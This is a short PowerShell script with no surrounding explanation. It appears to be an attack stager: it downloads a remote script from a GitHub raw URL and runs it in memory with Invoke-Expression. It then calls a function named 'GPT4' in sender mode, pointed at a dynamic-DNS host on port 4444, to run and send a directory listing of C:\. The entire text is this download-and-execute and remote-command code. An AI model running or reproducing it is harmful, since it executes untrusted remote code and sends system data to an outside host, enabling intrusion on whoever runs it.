$IPAddress = "suber122.duckdns.org"
$Port = 4444
$Command = "Get-ChildItem C:\"
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anilxpm/powerl/master/gpt4.ps1') | Out-Null
GPT4 -Mode sender -IPAddress $IPAddress -Port $Port -Command $Command
